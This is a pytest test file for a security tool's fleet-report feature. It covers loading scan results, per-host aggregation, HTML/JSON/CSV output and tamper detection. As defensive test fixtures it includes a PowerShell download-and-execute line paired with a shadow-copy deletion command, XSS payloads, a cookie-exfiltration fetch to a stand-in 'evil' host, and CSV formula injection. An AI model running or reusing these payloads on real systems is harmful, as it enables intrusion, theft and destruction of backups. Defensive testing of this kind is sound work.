"""`aegis fleet`: loading scan-result files from a shared folder, the per-host and fleet-wide aggregation, the HTML /
JSON / CSV outputs, recognition of those outputs by the file scanner, and the CLI. Pure Python; no network."""

from __future__ import annotations

import csv
import datetime as dt
import io
import json
import os
import re
from pathlib import Path

import pytest

from aegis.core import fleet as F
from aegis.core.models import CheckResult, CheckStatus, Finding, Remediation, ScanResult, Severity
from aegis.core.report import is_aegis_report, render_html as scan_report_html
from aegis.core.scoring import security_score

NOW = dt.datetime(2026, 10, 16, 12, 0, 0)
CRADLE = "IEX (New-Object Net.WebClient).DownloadString('http://x/a') ; vssadmin delete shadows /all /quiet"


def finding(rule, title, sev, loc="", rec="Fix it.", fix=False):
    return Finding(rule, title, sev, "system", "long description", loc or f"loc-{rule}", {"secret": "NOT-IN-OUTPUT"}, rec,
                   Remediation("quarantine_file", {"path": loc or rule}) if fix else None)


def scan(host, started, findings=(), profile="full", os_name="windows", platform="", admin=True, scanners=("files",)):
    platform = platform or ("Windows-10-10.0.19045-SP0" if os_name == "windows" else "Linux-6.1.0-x86_64-with-glibc2.36")
    r = ScanResult(profile=profile, started=started, finished=started,
                   host={"hostname": host, "os": os_name, "platform": platform, "admin": admin}, scanners=list(scanners))
    for f in findings:
        r.add(f)
    return r


def save(folder: Path, name: str, result: ScanResult) -> Path:
    folder.mkdir(parents=True, exist_ok=True)
    p = folder / name
    p.write_text(result.to_json(), encoding="utf-8")
    return p


A = lambda: finding("R-A", "Outdated Chrome", Severity.HIGH, "chrome")  # noqa: E731
B = lambda: finding("R-B", "Firewall off", Severity.MEDIUM, "fw")  # noqa: E731
C = lambda: finding("R-C", "Known malware", Severity.CRITICAL, "C:\\Users\\bob\\evil.exe", fix=True)  # noqa: E731
D = lambda: finding("R-D", "Guest account on", Severity.MEDIUM, "guest")  # noqa: E731
E = lambda: finding("R-E", "Old setting", Severity.LOW, "old")  # noqa: E731


def sample():
    """Four hosts: PC-01 (three scans, getting worse), pc-02, ubuntu-1 (quick then full), LAPTOP-7 (not scanned for weeks)."""
    return [
        scan("PC-01", "2026-10-01T09:00:00", [A()]),
        scan("PC-01", "2026-10-15T09:00:00", [A(), B(), C()]),
        scan("PC-01", "2026-10-08T09:00:00", [A(), B()]),
        scan("pc-02", "2026-10-14T09:00:00", [A(), D()]),
        scan("ubuntu-1", "2026-10-12T07:00:00", [], profile="quick", os_name="linux"),
        scan("ubuntu-1", "2026-10-16T07:00:00", [D(), E()], os_name="linux"),
        scan("LAPTOP-7", "2026-09-20T09:00:00", [], profile="quick", admin=False),
    ]


def build(results=None, **kw) -> F.Fleet:
    kw.setdefault("now", NOW)
    return F.build_fleet(sample() if results is None else results, **kw)


def host(fleet, name):
    return next(h for h in fleet.hosts if h.hostname == name)


# --------------------------------------------------------------------------- aggregation

def test_newest_result_per_host_and_hostnames_match_case_insensitively():
    results = sample() + [scan("PC-02", "2026-10-02T09:00:00", [A()])]  # same machine as pc-02, older, other case
    fleet = build(results)
    assert sorted(h.hostname for h in fleet.hosts) == ["LAPTOP-7", "PC-01", "pc-02", "ubuntu-1"]
    pc1 = host(fleet, "PC-01")
    assert pc1.last_scan == "2026-10-15T09:00:00" and pc1.scans == 3
    assert (host(fleet, "pc-02").scans, host(fleet, "pc-02").last_scan) == (2, "2026-10-14T09:00:00")
    assert fleet.totals["hosts"] == 4 and fleet.totals["results"] == 8


def test_new_since_previous_score_change_and_trend():
    pc1 = host(build(), "PC-01")
    older = security_score(scan("x", "2026-10-08T09:00:00", [A(), B()]))[0]
    assert pc1.new_findings == 1  # only the malware is new; A and B were already there
    assert pc1.score_change == pc1.score - older and pc1.score_change < 0
    assert pc1.previous_scan == "2026-10-08T09:00:00"
    assert [d for d, _s in pc1.trend] == ["2026-10-01", "2026-10-08", "2026-10-15"]
    assert pc1.trend[-1][1] == pc1.score and pc1.trend[0][1] > pc1.trend[-1][1]
    assert [f["new"] for f in pc1.findings] == [True, False, False]  # critical, high, medium: worst first
    single = host(build(), "pc-02")
    assert single.new_findings is None and single.score_change is None and single.previous_scan is None
    assert len(single.trend) == 1


def test_previous_is_the_same_kind_of_scan():
    ubuntu = host(build(), "ubuntu-1")  # a quick scan precedes the full one: not comparable, so no baseline
    assert ubuntu.profile == "full" and ubuntu.scans == 2
    assert ubuntu.new_findings is None and ubuntu.score_change is None and len(ubuntu.trend) == 1
    custom = [scan("h", "2026-10-01T09:00:00", [A()], profile="custom", scanners=("files",)),
              scan("h", "2026-10-02T09:00:00", [A(), B()], profile="custom", scanners=("network",)),
              scan("h", "2026-10-03T09:00:00", [A(), B(), D()], profile="custom", scanners=("files",))]
    h = host(build(custom), "h")  # custom: same scanners only, so the 10-01 scan is the baseline
    assert h.previous_scan == "2026-10-01T09:00:00" and h.new_findings == 2 and len(h.trend) == 2


def test_new_findings_follow_the_minimum_severity_and_ignore_pid_suffixes():
    old = scan("h", "2026-10-01T09:00:00", [finding("P", "Process", Severity.MEDIUM, "proc (pid 100)")])
    new = scan("h", "2026-10-02T09:00:00", [finding("P", "Process", Severity.MEDIUM, "proc (pid 200)"), E(), D()])
    assert host(build([old, new]), "h").new_findings == 1  # the restarted process is not new; the low one is not counted
    assert host(build([old, new], min_severity=Severity.LOW), "h").new_findings == 2


def test_the_same_scan_found_twice_does_not_become_the_previous_one():
    a = scan("h", "2026-10-01T09:00:00", [A()])
    a.stats["source_file"] = "share/h.json"
    copy = scan("h", "2026-10-01T09:00:00", [A()])
    copy.stats["source_file"] = "reports/scan-full.json"
    fleet = build([a, copy])
    h = host(fleet, "h")
    assert h.scans == 1 and h.new_findings is None and fleet.totals["duplicates"] == 1 and fleet.totals["results"] == 1


def test_stale_hosts_with_an_injected_now():
    fleet = build(since_days=14)
    assert [h.hostname for h in fleet.hosts if h.stale] == ["LAPTOP-7"]
    assert host(fleet, "LAPTOP-7").age_days == 26 and fleet.totals["stale"] == 1 and len(fleet.hosts) == 4  # kept, not dropped
    assert not build().totals["stale"] and not any(h.stale for h in build().hosts)  # no --since: nothing is stale
    edge = [scan("h", "2026-10-09T12:00:00", [])]
    assert not host(build(edge, since_days=7), "h").stale  # exactly 7 days is not older than 7 days
    edge = [scan("h", "2026-10-09T11:59:59", [])]
    assert host(build(edge, since_days=7), "h").stale
    future = [scan("h", "2026-11-01T00:00:00", [])]  # clock skew: never stale, never a negative age
    assert not host(build(future, since_days=1), "h").stale and host(build(future), "h").age_days == 0


def test_timestamps_with_offsets_are_compared_in_utc():
    results = [scan("h", "2026-10-16T09:00:00+02:00", [A()]), scan("h", "2026-10-16T08:00:00Z", [])]
    h = host(build(results), "h")
    assert h.last_scan == "2026-10-16T08:00:00" and h.scans == 2  # 07:00 UTC is the older one
    assert F.parse_time("garbage") is None and F.parse_time("") is None and F.parse_time("2026-10-16T09:00:00Z")


def test_hosts_are_listed_worst_first_and_totals():
    fleet = build(since_days=14)
    assert [h.hostname for h in fleet.hosts] == ["PC-01", "pc-02", "ubuntu-1", "LAPTOP-7"]
    t = fleet.totals
    scores = [h.score for h in fleet.hosts]
    assert t["hosts"] == 4 and t["needing_attention"] == 2 and t["stale"] == 1
    assert t["average_score"] == round(sum(scores) / 4, 1)
    assert [h.worst() for h in fleet.hosts] == ["critical", "high", "medium", "clean"]
    assert F.exceeds(fleet, Severity.HIGH) and F.exceeds(fleet, Severity.CRITICAL) and F.exceeds(fleet, Severity.LOW)
    quiet = build([scan("h", "2026-10-16T09:00:00", [B(), E()])])
    assert not F.exceeds(quiet, Severity.HIGH) and F.exceeds(quiet, Severity.MEDIUM) and quiet.totals["needing_attention"] == 0


def test_common_issues_grouping_and_order():
    results = [
        scan("h1", "2026-10-16T09:00:00", [finding("R-UPD", "Update available for Chrome", Severity.MEDIUM, "chrome", "Update it."),
                                           finding("R-FW", "Firewall off", Severity.HIGH, "fw", "Turn it on."), E()]),
        scan("h2", "2026-10-16T09:00:00", [finding("R-UPD", "Update available for Edge", Severity.HIGH, "edge", "Update it."),
                                           finding("R-UPD", "Update available for Zoom", Severity.MEDIUM, "zoom", "Update it."),
                                           finding("R-FW", "Firewall off", Severity.HIGH, "fw", "Turn it on.")]),
        scan("h3", "2026-10-16T09:00:00", [finding("R-UPD", "Update available for Edge", Severity.MEDIUM, "edge", "Update it."),
                                           finding("R-ONE", "Known malware", Severity.CRITICAL, "x", "Remove it.")]),
        scan("h3", "2026-09-01T09:00:00", [finding("R-OLD", "Fixed long ago", Severity.CRITICAL, "y")]),  # not the newest result
    ]
    issues = {c.rule_id: c for c in build(results).common_issues}
    assert list(issues) == ["R-ONE", "R-UPD", "R-FW"]  # critical; then high, the rule on 3 hosts before the one on 2
    assert "R-OLD" not in issues and "R-E" not in issues  # only newest results, only MEDIUM and above
    upd = issues["R-UPD"]
    assert (upd.severity, upd.hosts, upd.host_names, upd.findings) == ("high", 3, ["h1", "h2", "h3"], 4)
    assert upd.title == "Update available for Edge" and upd.variants == 2  # worst instance; Chrome and Zoom are "similar"
    assert upd.recommendation == "Update it." and issues["R-FW"].hosts == 2 and issues["R-FW"].recommendation == "Turn it on."
    ordered = build([scan("a", "2026-10-16T09:00:00", [finding("R1", "One host", Severity.HIGH)]),
                     scan("b", "2026-10-16T09:00:00", [finding("R2", "Two hosts", Severity.HIGH)]),
                     scan("c", "2026-10-16T09:00:00", [finding("R2", "Two hosts", Severity.HIGH)])])
    assert [c.rule_id for c in ordered.common_issues] == ["R2", "R1"]  # same severity: more hosts first
    high_only = {c.rule_id: c for c in build(results, min_severity=Severity.HIGH).common_issues}
    assert list(high_only) == ["R-ONE", "R-FW", "R-UPD"] and high_only["R-UPD"].hosts == 1 and high_only["R-UPD"].variants == 0


def test_host_details_are_limited_and_use_the_action_plan():
    many = [finding(f"R-{i}", f"Issue {i}", Severity.MEDIUM, f"loc{i}") for i in range(F.MAX_HOST_FINDINGS + 5)]
    h = host(build([scan("h", "2026-10-16T09:00:00", [C(), A(), E()] + many)]), "h")
    assert h.findings_total == F.MAX_HOST_FINDINGS + 7 and len(h.findings) == F.MAX_HOST_FINDINGS
    assert [f["severity"] for f in h.findings[:2]] == ["critical", "high"] and all(f["severity"] != "low" for f in h.findings)
    assert [a["rule_id"] for a in h.actions[:2]] == ["R-C", "R-A"] and len(h.actions) == 3
    assert h.actions[0]["fix"].startswith("aegis fix --id ") and h.actions[0]["recommendation"] == "Fix it."
    assert not host(build([scan("h", "2026-10-16T09:00:00", [E()])]), "h").findings


def test_a_result_without_hostname_is_named_after_its_file_and_garbage_times_are_ignored():
    r = scan("", "2026-10-16T09:00:00", [A()])
    r.stats["source_file"] = os.path.join("share", "KIOSK-3.json")
    bad = scan("x", "not a time", [A()])
    fleet = build([r, bad])
    assert [h.hostname for h in fleet.hosts] == ["KIOSK-3"]
    assert build([scan("", "2026-10-16T09:00:00", [])]).hosts[0].hostname == "unknown"


# --------------------------------------------------------------------------- loading

def test_load_keeps_only_aegis_scan_results_and_counts_the_rest(tmp_path):
    save(tmp_path, "good.json", scan("PC-01", "2026-10-15T09:00:00", [A()]))
    (tmp_path / "other.json").write_text('{"hello": "world"}', encoding="utf-8")
    (tmp_path / "corrupt.json").write_text('{"generator": "Aegis Security Suite", "findings": [', encoding="utf-8")
    (tmp_path / "binary.json").write_bytes(b"\x00\x01\xff\xfe\x80garbage")
    (tmp_path / "list.json").write_text("[1, 2, 3]", encoding="utf-8")
    (tmp_path / "deep.json").write_text("[" * 100000, encoding="utf-8")
    (tmp_path / "notes.txt").write_text("not json at all", encoding="utf-8")  # not looked at: folders only yield *.json
    (tmp_path / "folder.json").mkdir()
    good = json.loads(scan("PC-02", "2026-10-15T09:00:00", [A()]).to_json())
    for name, mutate in {
        "no-marker.json": lambda d: d.pop("generator"),
        "wrong-marker.json": lambda d: d.update(generator="Other Tool"),
        "no-findings.json": lambda d: d.pop("findings"),
        "no-score.json": lambda d: d.pop("score"),
        "bad-severity.json": lambda d: d["findings"][0].update(severity="apocalyptic"),
        "bad-field.json": lambda d: d["findings"][0].update(unknown_field=1),
        "bad-type.json": lambda d: d["findings"][0].update(title=["not", "text"]),
        "bad-host.json": lambda d: d.update(host="a string"),
        "no-time.json": lambda d: d.update(started=""),
        "bad-time.json": lambda d: d.update(started="yesterday"),
        "bad-check.json": lambda d: d.update(checks=[{"nonsense": 1}]),
    }.items():
        d = json.loads(json.dumps(good))
        mutate(d)
        (tmp_path / name).write_text(json.dumps(d), encoding="utf-8")
    rep = F.load_results([str(tmp_path)])
    assert [r.host["hostname"] for r in rep.results] == ["PC-01"]
    assert len(rep.skipped) == 16 and not rep.missing and not rep.limit_reached
    reasons = dict((Path(p).name, why) for p, why in rep.skipped)
    assert reasons["corrupt.json"] == "not valid JSON" and reasons["other.json"] == "not an Aegis scan result"
    assert reasons["bad-time.json"] == "no valid scan time" and "folder.json" not in reasons  # a folder is not a candidate
    assert all("hello" not in why and "world" not in why for why in reasons.values())  # reasons never quote the file
    fleet = F.build_fleet(rep.results, now=NOW, load=rep)
    assert fleet.skipped["count"] == 16 and F.skipped_note(fleet) == "Skipped 16 files that are not Aegis scan results."
    assert {x["reason"] for x in fleet.skipped["files"]} >= {"not valid JSON", "not an Aegis scan result"}


def test_loaded_results_are_slim_and_the_score_is_recomputed(tmp_path):
    r = scan("h", "2026-10-15T09:00:00", [C()])
    r.checks = [CheckResult("C1", "Firewall", CheckStatus.FAIL, "off"), CheckResult("C2", "Updates", CheckStatus.PASS, "ok")]
    d = r.to_dict()
    d["score"], d["grade"] = 100, "A"  # a stored score is not trusted
    d["host"]["hostname"] = "evil\x1b[31m\nhost"
    (tmp_path / "r.json").write_text(json.dumps(d), encoding="utf-8")
    rep = F.load_results([str(tmp_path)])
    slim = rep.results[0]
    assert slim.findings[0].evidence == {} and slim.findings[0].description == "" and slim.stats == {"source_file": str(tmp_path / "r.json")}
    assert [c.check_id for c in slim.checks] == ["C1"]  # only the failed checks matter for the score
    assert slim.host["hostname"] == "evil [31m host"  # no terminal escapes or line breaks
    h = F.build_fleet(rep.results, now=NOW).hosts[0]
    assert (h.score, h.grade) == security_score(r) and h.score < 100


def test_oversized_and_special_files_are_skipped_unread(tmp_path, monkeypatch):
    assert F.MAX_FILE_BYTES == 64 * 1024 * 1024 and F.MAX_FILES == 5000
    p = save(tmp_path, "big.json", scan("big", "2026-10-15T09:00:00", [A()]))
    save(tmp_path, "small.json", scan("small", "2026-10-15T09:00:00", []))
    monkeypatch.setattr(F, "MAX_FILE_BYTES", p.stat().st_size - 1)
    rep = F.load_results([str(tmp_path)])
    assert dict((Path(f).name, why) for f, why in rep.skipped)["big.json"].startswith("larger than ")
    if hasattr(os, "mkfifo"):  # reading a named pipe would block forever
        os.mkfifo(tmp_path / "pipe.json")
        rep = F.load_results([str(tmp_path / "pipe.json")])
        assert rep.skipped == [(str(tmp_path / "pipe.json"), "not a regular file")] and not rep.results


def test_folders_are_not_searched_recursively_unless_asked(tmp_path):
    save(tmp_path, "a.json", scan("top", "2026-10-15T09:00:00", []))
    save(tmp_path / "sub", "b.json", scan("sub", "2026-10-15T09:00:00", []))
    save(tmp_path / "sub" / "deeper", "c.json", scan("deeper", "2026-10-15T09:00:00", []))
    assert [r.host["hostname"] for r in F.load_results([str(tmp_path)]).results] == ["top"]
    names = sorted(r.host["hostname"] for r in F.load_results([str(tmp_path)], recursive=True).results)
    assert names == ["deeper", "sub", "top"]


def test_file_arguments_wildcards_missing_paths_and_repeats(tmp_path):
    p = save(tmp_path, "pc.json", scan("pc", "2026-10-15T09:00:00", []))
    odd = tmp_path / "result.txt"  # an explicit file is examined whatever it is called
    odd.write_text(p.read_text(encoding="utf-8"), encoding="utf-8")
    save(tmp_path / "share", "x1.json", scan("x1", "2026-10-15T09:00:00", []))
    save(tmp_path / "share", "x2.json", scan("x2", "2026-10-15T09:00:00", []))
    rep = F.load_results([str(p), str(p), str(tmp_path), str(odd), str(tmp_path / "share" / "x*.json"),
                          str(tmp_path / "nope"), str(tmp_path / "gone" / "*.json")])
    assert sorted(r.host["hostname"] for r in rep.results) == ["pc", "pc", "x1", "x2"]  # pc.json once, result.txt once
    assert rep.missing == [str(tmp_path / "nope"), str(tmp_path / "gone" / "*.json")]
    assert F.build_fleet(rep.results, now=NOW, load=rep).skipped["paths_not_found"] == rep.missing


def test_file_count_limit(tmp_path):
    for i in range(5):
        save(tmp_path, f"h{i}.json", scan(f"h{i}", "2026-10-15T09:00:00", []))
    rep = F.load_results([str(tmp_path)], limit=3)
    assert len(rep.results) == 3 and rep.limit_reached
    assert not F.load_results([str(tmp_path)], limit=5).limit_reached  # exactly at the limit is fine
    fleet = F.build_fleet(rep.results, now=NOW, load=rep)
    assert "Stopped after reading 5,000 files" in F.skipped_note(fleet)


def test_powershell_redirected_json_is_read(tmp_path):
    text = scan("PS-5", "2026-10-15T09:00:00", [A()]).to_json()
    (tmp_path / "utf16.json").write_bytes(text.encode("utf-16"))  # Windows PowerShell 5 `>` writes UTF-16 with a BOM
    (tmp_path / "bom.json").write_bytes(b"\xef\xbb\xbf" + text.encode("utf-8"))
    rep = F.load_results([str(tmp_path)])
    assert [r.host["hostname"] for r in rep.results] == ["PS-5", "PS-5"] and not rep.skipped


def test_the_fleet_outputs_are_not_scan_results(tmp_path):
    out = F.write_fleet(build(), tmp_path / "fleet.json")
    rep = F.load_results([str(out)])
    assert not rep.results and rep.skipped == [(str(out), "not an Aegis scan result")]


# --------------------------------------------------------------------------- outputs

def hostile_fleet() -> F.Fleet:
    results = [scan('pc"><b onmouseover=alert(1)>', "2026-10-16T09:00:00", [
        finding("R-X", "</script><script>alert(1)</script>", Severity.CRITICAL, "<img src=x onerror=alert(1)>", CRADLE),
        finding("R-Y", CRADLE, Severity.HIGH, "javascript:alert(1)", "<iframe src=//evil></iframe>"),
        finding("R-Z", '"><svg onload=alert(1)>', Severity.MEDIUM, "x")], platform="<b>Windows</b>")]
    return build(results, since_days=30)


def test_html_page_content_and_escaping():
    page = F.render_html(hostile_fleet())
    low = page.lower()
    assert low.count("<script") == 1 and low.count("</script>") == 1 and "<img" not in low and "<iframe" not in low
    assert "&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;" in page and "&lt;img src=x onerror=alert(1)&gt;" in page
    assert "&quot;&gt;&lt;b onmouseover=alert(1)&gt;" in page and "<b onmouseover" not in page and "<svg onload" not in page
    assert "&lt;b&gt;Windows&lt;/b&gt;" in page and "<b>Windows</b>" not in page
    assert "NOT-IN-OUTPUT" not in page and "long description" not in page  # evidence and descriptions never leave the scan
    assert is_aegis_report(page.encode("utf-8"), "html")


def test_html_page_sections():
    fleet = build(since_days=14)
    page = F.render_html(fleet)
    assert page.startswith("<!doctype html>") and 'content="Aegis Security Suite"' in page and "\r" not in page
    assert "prefers-color-scheme: dark" in page and "--bg:#f6f7f9" in page  # same light/dark variables as the scan report
    assert page.count("<script") == 1 and page.index("<h1>Aegis Fleet Overview</h1>") < page.index('class="tiles"')
    tiles = dict(re.findall(r'<div class="n[^"]*">([^<]*)</div><div class="l">([^<]*)</div>', page)[i][::-1] for i in range(4))
    assert tiles == {"Hosts": "4", "Need attention": "2", "Average score": f"{fleet.totals['average_score']:g}",
                     "Stale (no scan in 14 days)": "1"}
    assert page.index('<table id="hosts">') < page.index("Most common issues across the fleet") < page.index("Host details")
    rows = re.findall(r'<tr><td data-v="([^"]*)"><a href="#h(\d)">', page)
    assert [r[0] for r in rows] == ["pc-01", "pc-02", "ubuntu-1", "laptop-7"] and [r[1] for r in rows] == list("0123")
    for heading in ("Host", "Platform", "Last scan", "Score", "Critical", "High", "Medium", "New since previous", "Score change", "Admin"):
        assert f">{heading}</th>" in page
    assert page.count('<span class="pill stale">stale</span>') == 1 and "26 days ago" in page
    assert page.count('<details class="host"') == 4 and "What to do first" in page and "Known malware" in page
    assert 'id="h0"' in page and "Windows-10-10.0.19045-SP0" in page and "Linux-6.1.0" in page
    assert re.search(r'<td class="r" data-v="1"><span class="num b-critical">1</span></td>', page)  # PC-01: one critical
    assert 'class="r down" data-v="' in page and '<span class="pill new">NEW</span>' in page
    assert "Stale (no --since given)" in F.render_html(build())
    assert "No findings at medium or above" in F.render_html(build([scan("h", "2026-10-16T09:00:00", [E()])]))


def test_json_output_structure():
    fleet = build(since_days=14)
    d = json.loads(F.render_json(fleet))
    assert list(d)[:3] == ["generator", "report", "schema"] and d["generator"] == "Aegis Security Suite" and d["report"] == "fleet"
    assert set(d) == {"generator", "report", "schema", "generated", "since_days", "min_severity", "totals", "hosts", "common_issues",
                      "skipped"}
    assert d["generated"] == "2026-10-16T12:00:00" and d["since_days"] == 14 and d["min_severity"] == "medium"
    assert d["totals"] == {"hosts": 4, "needing_attention": 2, "stale": 1, "average_score": fleet.totals["average_score"],
                           "results": 7, "duplicates": 0, "issue_kinds": len(d["common_issues"])}
    pc1 = d["hosts"][0]
    assert pc1["hostname"] == "PC-01" and pc1["os"] == "windows" and pc1["admin"] is True and pc1["profile"] == "full"
    assert pc1["counts"] == {"critical": 1, "high": 1, "medium": 1, "low": 0, "info": 0}
    assert pc1["new_findings"] == 1 and pc1["score_change"] < 0 and pc1["stale"] is False and pc1["scans"] == 3
    assert pc1["findings"][0]["severity"] == "critical" and pc1["findings"][0]["new"] is True and pc1["actions"][0]["rule_id"] == "R-C"
    assert [x["date"] for x in pc1["trend"]] == ["2026-10-01", "2026-10-08", "2026-10-15"]
    assert d["hosts"][3]["hostname"] == "LAPTOP-7" and d["hosts"][3]["stale"] is True and d["hosts"][3]["admin"] is False
    assert d["common_issues"][0] == {"rule_id": "R-C", "title": "Known malware", "severity": "critical", "hosts": 1,
                                     "host_names": ["PC-01"], "findings": 1, "variants": 0, "recommendation": "Fix it."}
    assert d["skipped"] == {"count": 0, "files": [], "paths_not_found": [], "limit_reached": False}
    assert F.render_json(build()).count('"stale": true') == 0 and "NOT-IN-OUTPUT" not in F.render_json(fleet)


def test_csv_output():
    rows = list(csv.reader(io.StringIO(F.render_csv(build(since_days=14)))))
    assert rows[0] == ["hostname", "platform", "last_scan", "profile", "score", "grade", "critical", "high", "medium", "low",
                       "new_findings", "score_change", "stale"]
    assert [r[0] for r in rows[1:]] == ["PC-01", "pc-02", "ubuntu-1", "LAPTOP-7"]
    pc1, pc2, _ub, laptop = rows[1:]
    assert pc1[1:4] == ["Windows-10-10.0.19045-SP0", "2026-10-15T09:00:00", "full"] and pc1[6:9] == ["1", "1", "1"]
    assert pc1[10] == "1" and int(pc1[11]) < 0 and pc1[12] == "no"
    assert pc2[10] == "" and pc2[11] == "" and laptop[12] == "yes" and laptop[3] == "quick"
    assert "\r" not in F.render_csv(build())


def test_csv_does_not_hand_formulas_to_a_spreadsheet():
    fleet = build([scan("=HYPERLINK(\"http://evil\")", "2026-10-16T09:00:00", [], platform="@SUM(A1)"),
                   scan("-2+3", "2026-10-16T09:00:00", [])])
    rows = list(csv.reader(io.StringIO(F.render_csv(fleet))))[1:]
    assert sorted(r[0] for r in rows) == ["'-2+3", "'=HYPERLINK(\"http://evil\")"]
    assert "'@SUM(A1)" in [r[1] for r in rows]


def test_write_fleet_formats_atomically_with_lf_line_endings(tmp_path):
    fleet = build(since_days=14)
    html_p = F.write_fleet(fleet, tmp_path / "out" / "fleet.html")  # creates the folder
    assert html_p.read_text(encoding="utf-8").startswith("<!doctype html>")
    assert json.loads(F.write_fleet(fleet, tmp_path / "f.json").read_text(encoding="utf-8"))["report"] == "fleet"
    assert F.write_fleet(fleet, tmp_path / "f.csv").read_text(encoding="utf-8").startswith("hostname,platform,")
    assert F.write_fleet(fleet, tmp_path / "noext").read_text(encoding="utf-8").startswith("<!doctype html>")
    assert F.write_fleet(fleet, tmp_path / "f.htm").read_bytes() == html_p.read_bytes()
    assert json.loads(F.write_fleet(fleet, tmp_path / "x.dat", fmt="json").read_text(encoding="utf-8"))["hosts"]
    for p in (html_p, tmp_path / "f.json", tmp_path / "f.csv"):
        assert b"\r\n" not in p.read_bytes()
    assert sorted(x.name for x in tmp_path.iterdir() if x.name.startswith(".")) == []  # no temp files left behind
    with pytest.raises(ValueError, match="html, json, csv"):
        F.write_fleet(fleet, tmp_path / "f.pdf")


def test_write_fleet_failure_keeps_the_old_file_and_cleans_up(tmp_path, monkeypatch):
    p = tmp_path / "fleet.html"
    p.write_text("previous report", encoding="utf-8")

    def boom(*_a, **_k):
        raise PermissionError("in use")

    monkeypatch.setattr(os, "replace", boom)
    with pytest.raises(PermissionError):
        F.write_fleet(build(), p)
    assert p.read_text(encoding="utf-8") == "previous report"
    assert sorted(x.name for x in tmp_path.iterdir() if x.name != "aegis_home") == ["fleet.html"]


def test_console_summary_is_plain_and_safe():
    r = scan("pc\x1b[2J", "2026-10-16T09:00:00", [finding("R", "bad\x1b[31m title", Severity.HIGH)])
    text = F.render_text(F.build_fleet([F.parse_result(r.to_json().encode())], now=NOW))
    assert "\x1b" not in text and "1 host," in text and "1 need attention" in text
    text = F.render_text(build(since_days=14), limit=2)
    assert "...and 2 more hosts" in text and "with no scan in the last 14 days" in text and "Most common issues:" in text
    assert "LAPTOP-7" not in text.split("Most common")[0]  # the limit cuts the table, not the summary line


# --------------------------------------------------------------------------- recognised as Aegis's own output

def test_real_fleet_outputs_are_recognised_even_when_they_quote_malicious_strings(ctx, tmp_path):
    from aegis.scanners.files import scan_file

    ctx.deep = True  # content-scan every file type, so a file is only skipped because it is recognised
    fleet = hostile_fleet()
    for name in ("fleet.html", "fleet.htm", "fleet.json"):
        p = F.write_fleet(fleet, tmp_path / name)
        assert is_aegis_report(p.read_bytes(), p.suffix.lstrip(".")), name
        assert is_aegis_report(p.read_bytes().replace(b"\n", b"\r\n"), p.suffix.lstrip(".")), name  # re-saved on Windows
        assert scan_file(ctx, p) == [], name
    for f in (build(), build([scan("h", "2026-10-16T09:00:00", [])]), build(sample() + [scan("h", "2026-10-16T09:00:00", [A()])],
                                                                                since_days=3)):
        assert is_aegis_report(F.render_html(f).encode("utf-8"), "html") and is_aegis_report(F.render_json(f).encode(), "json")


def test_existing_report_kinds_are_still_recognised_and_not_mixed_up(tmp_path):
    r = scan("h", "2026-10-16T09:00:00", [A()])
    assert is_aegis_report(scan_report_html(r).encode("utf-8"), "html") and is_aegis_report(r.to_json().encode(), "json")
    page = F.render_html(build()).encode("utf-8")
    assert not is_aegis_report(page, "csv") and not is_aegis_report(page, "sarif") and not is_aegis_report(page, "txt")
    assert not is_aegis_report(F.render_csv(build()).encode(), "csv")  # the fleet CSV has no finding text to whitelist
    # a scan report that claims to be a fleet page, or a fleet page without the frame, is judged as a fleet page
    forged = scan_report_html(r).replace('<meta name="generator" content="Aegis Security Suite">',
                                         '<meta name="generator" content="Aegis Security Suite">\n<meta name="aegis-report" content="fleet">')
    assert not is_aegis_report(forged.encode("utf-8"), "html")
    d = json.loads(r.to_json())
    d["report"] = "fleet"
    assert not is_aegis_report(json.dumps(d, indent=2).encode(), "json")


@pytest.mark.parametrize("fragment", [
    "<script>fetch('http://evil/'+document.cookie)</script>", "<img src=x onerror=alert(1)>", "<iframe src=//evil></iframe>",
    "<form action=//evil><input name=p></form>", "<object data=x></object>", "<style>@import url(//evil/x.css)</style>",
    '<svg onload="alert(1)"></svg>', '<a href="javascript:alert(1)">x</a>', '<a href="//evil/x">x</a>',
    '<a href="#h0" target="_blank">x</a>', '<p style="background:url(//evil/x)">x</p>', '<p onclick="alert(1)">x</p>',
    "<p>unterminated <b</p>", "<p>a > b</p>", "<p class=unquoted>x</p>", "<p class='single'>x</p>",
    '<meta http-equiv="refresh" content="0;url=//evil">', '<link rel="stylesheet" href="//evil/x.css">',
    '<base href="//evil/">', "<!-- " + CRADLE + " -->", "<![CDATA[x]]>", "<?php echo 1 ?>", "<p>x</P>",
])
def test_markup_the_page_never_emits_is_not_recognised(fragment):
    page = F.render_html(hostile_fleet())
    assert is_aegis_report(page.encode("utf-8"), "html")
    bad = page.replace("<footer>", fragment + "<footer>", 1)  # inside the body, so only the markup rules can catch it
    assert bad != page and not is_aegis_report(bad.encode("utf-8"), "html")


@pytest.mark.parametrize("tamper", [
    lambda s: s.replace("(function(){", "(function(){fetch('//evil');", 1),
    lambda s: s.replace("</script></body>", "</script><script>alert(1)</script></body>"),
    lambda s: s.replace("<title>Aegis Fleet Overview</title>", "<title>Aegis Fleet Overview</title><script src=//evil/x.js></script>"),
    lambda s: s.replace("<style>", "<style>body{background:url(//evil/x)}", 1),
    lambda s: s + "<script>alert(1)</script>",
    lambda s: s + "\n<!-- trailing -->",
    lambda s: "<!-- leading -->" + s,
    lambda s: s.replace('<meta name="aegis-report" content="fleet">', ""),
    lambda s: s.replace('<meta name="generator" content="Aegis Security Suite">', '<meta name="generator" content="Other">'),
    lambda s: s.replace("</html>", "</html>" + CRADLE),
    lambda s: s[:len(s) // 2],
])
def test_a_changed_page_frame_is_not_recognised(tamper):
    page = F.render_html(hostile_fleet())
    bad = tamper(page)
    assert bad != page and not is_aegis_report(bad.encode("utf-8"), "html")


def test_a_tampered_page_is_scanned_like_any_other_file(ctx, tmp_path):
    from aegis.scanners.files import scan_file

    ctx.deep = True
    page = F.render_html(hostile_fleet())
    tampered = tmp_path / "tampered.html"
    tampered.write_bytes(page.replace("<footer>", f"<script>{CRADLE}</script><footer>", 1).encode("utf-8"))
    genuine = tmp_path / "genuine.html"
    genuine.write_bytes(page.encode("utf-8"))
    assert scan_file(ctx, genuine) == [] and scan_file(ctx, tampered)


def test_a_hand_made_lookalike_page_is_not_recognised():
    marker = '<meta name="generator" content="Aegis Security Suite">'
    for page in (f"<!doctype html><html><head>{marker}</head><body><script>{CRADLE}</script></body></html>",
                 f'<!doctype html><html><head>{marker}<meta name="aegis-report" content="fleet"></head><body>{CRADLE}</body></html>',
                 marker + '<meta name="aegis-report" content="fleet">'):
